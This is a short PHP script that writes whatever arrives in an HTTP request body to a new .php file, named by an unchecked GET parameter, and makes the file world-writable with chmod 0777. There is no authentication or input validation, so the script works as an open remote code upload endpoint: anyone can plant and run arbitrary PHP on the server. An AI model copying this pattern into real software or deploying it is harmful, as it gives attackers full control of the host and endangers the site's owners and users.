<?php

	require_once 'file_lib.php';

	if(isset($_GET['script'])){
		$script_name = $_GET['script'];
	}else{
		$script_name = $argv[1];
	}

	$body = http_get_request_body();

	$php_content = "<?php \n".$body."\n ?>";

	write_file($script_name.'.php', $php_content);

	chmod($script_name.'.php', 0777);

	//echo exec('php script.php');

?>